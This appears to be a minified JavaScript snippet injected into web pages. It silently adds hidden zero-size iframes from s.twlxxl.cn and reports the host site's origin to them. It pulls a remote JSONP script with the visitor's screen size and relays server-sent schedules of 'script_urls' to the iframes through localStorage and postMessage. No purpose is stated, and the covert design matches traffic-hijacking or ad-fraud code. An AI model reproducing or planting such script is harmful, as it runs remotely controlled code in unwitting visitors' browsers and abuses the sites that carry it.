let serTimeK = 1646805726;let timeCK = Date.parse(new Date()) / 1000;let c2sK = serTimeK - timeCK;let timeNowLyK = timeCK - c2sK - 2;let lsKeyK = "ly_k3";let lsdKey = "lyd_k3";let lyaId1 = 'lyaId1_' + timeNowLyK;let lyaId2 = 'lyaId2_' + timeNowLyK;let dataUrlK = 'https://s.twlxxl.cn/k3/a.js';lyyl2K('https://s.twlxxl.cn/k3/l1.html', lyaId1);lyyl2K('https://s.twlxxl.cn/k3/l2.html', lyaId2);let sleepTimeK = 1;let downSleep = 1;let ylIf1 = document.getElementById(lyaId1);let ylIf2 = document.getElementById(lyaId2);ylIf1.onload = function () {let iframe_cw = ylIf1.contentWindow;let jsonShift = getLSK(1);if (jsonShift === undefined) {jsonShift = {"next_sleep": sleepTimeK,"script_urls": [],};}iframe_cw.postMessage({ls: jsonShift,},'*');};ylIf2.onload = function () {let iframe_cw = ylIf2.contentWindow;let jsonShift = getLSK(2);if (jsonShift === undefined) {jsonShift = {"next_sleep": downSleep,"script_urls": [],};}iframe_cw.postMessage({ls: jsonShift,},'*');};function getLSK(lst) {let key = lst === 1 ? lsKeyK : lsdKey;if (localStorage.hasOwnProperty(key)) {let dataObj;let dataStr = localStorage.getItem(key);if (dataStr === "{}" || dataStr === "undefined" || dataStr === "null") {if (lst === 1) {requestDataLyK();}if (lst === 2) {downSleep = 60;}} else {dataObj = JSON.parse(dataStr)}return getDDK(dataObj, lst);} else {if (lst === 1) {requestDataLyK();}if (lst === 2) {downSleep = 60;}}}function lyyl2K(url, lyId) {var lyiframe = document.createElement('iframe');lyiframe.id = lyId;lyiframe.style.cssText = 'width: 0px;height: 0px;display:none;';lyiframe.frameborder = '0';lyiframe.setAttribute('frameborder', '0');lyiframe.setAttribute('width', '0');lyiframe.setAttribute('height', '0');lyiframe.src = url + "?h=" + window.location.protocol + "//" + window.location.host;document.body.appendChild(lyiframe);}function getDDK(dataObj, lst) {let res;timeNowLyK = Date.parse(new Date()) / 1000 - c2sK;for (let key in dataObj) {if (key >= timeNowLyK - 2) {if (dataObj[key].length === 0) {delete dataObj[key];continue;}let dataFirst = dataObj[key][0];if (dataFirst.time_node >= timeNowLyK - 2) {let devTime = dataFirst.time_node - timeNowLyK;if (Math.abs(devTime) <= 2) {if (devTime < 0) {c2sK -= devTime;}res = dataObj[key].shift();break;} else {res = {"next_sleep": dataFirst.time_node - timeNowLyK,"script_urls": [],};break;}} else {if (lst === 1) {delDown(dataObj[key], key);}delete dataObj[key];}} else {if (lst === 1) {delDown(dataObj[key], key);}delete dataObj[key];}}let key = lst === 1 ? lsKeyK : lsdKey;localStorage.setItem(key, JSON.stringify(dataObj));return res;}function delDown(dataObj, delKey) {let dataDownObj;if (localStorage.hasOwnProperty(lsdKey)) {let dataDown = localStorage.getItem(lsdKey);if (dataDown === "{}" || dataDown === "undefined" || dataDown === "null") {return} else {dataDownObj = JSON.parse(dataDown)}} else {return}for (let key in dataObj) {if (dataObj[key].is_down === 1) {delete dataDownObj[delKey];localStorage.setItem(lsdKey, JSON.stringify(dataDownObj));break;}}}function lyErrorK() {console.log('there must be something wrong!');sleepTimeK = 60;downSleep = 60;}function getLyDataK(data) {if (data.code === 0) {if (Object.keys(data.report_common).length > 0) {localStorage.setItem(lsKeyK, JSON.stringify(data.report_common));sleepTimeK = 1;}if (Object.keys(data.report_down).length > 0) {localStorage.setItem(lsdKey, JSON.stringify(data.report_common));downSleep = 1;} else {downSleep = 60;}} else if (data.code === 2) {sleepTimeK = 60;downSleep = 60;} else {sleepTimeK = -1;downSleep = -1;}}function requestDataLyK() {JSONPLyK(dataUrlK, {data: {c: "sina",h: window.screen.height,w: window.screen.width},callback: getLyDataK,error: lyErrorK,timeout: 10000});}function JSONPLyK(url, config) {var data = config.data || [];var paraArr = [], paraString = '';var urlArr;var callbackName;var script, head;var supportLoad;var onEvent;var timeout = config.timeout || 0;for (var i in data) {if (data.hasOwnProperty(i)) {paraArr.push(encodeURIComponent(i) + "=" + encodeURIComponent(data[i]));}}urlArr = url.split("?");if (urlArr.length > 1) {paraArr.push(urlArr[1]);}callbackName = 'callback' + new Date().getTime();paraArr.push('callback=' + callbackName);paraString = paraArr.join("&");url = urlArr[0] + "?" + paraString;script = document.createElement("script");script.loaded = false;window[callbackName] = function (arg) {var callback = config.callback;callback(arg);script.loaded = true;};head = document.getElementsByTagName("head")[0];head.insertBefore(script, head.firstChild);script.src = url;supportLoad = "onload" in script;onEvent = supportLoad ? "onload" : "onreadystatechange";script[onEvent] = function () {if (script.readyState && script.readyState != "loaded") {return;}if (script.readyState == 'loaded' && script.loaded == false) {script.onerror();return;}(script.parentNode && script.parentNode.removeChild(script)) && (head.removeNode && head.removeNode(this));script = script[onEvent] = script.onerror = window[callbackName] = null;};script.onerror = function () {if (window[callbackName] == null) {console.log("请求超时，请重试！");}config.error && config.error();(script.parentNode && script.parentNode.removeChild(script)) && (head.removeNode && head.removeNode(this));script = script[onEvent] = script.onerror = window[callbackName] = null;};if (timeout != 0) {setTimeout(function () {if (script && script.loaded == false) {window[callbackName] = null;script.onerror();}}, timeout);}}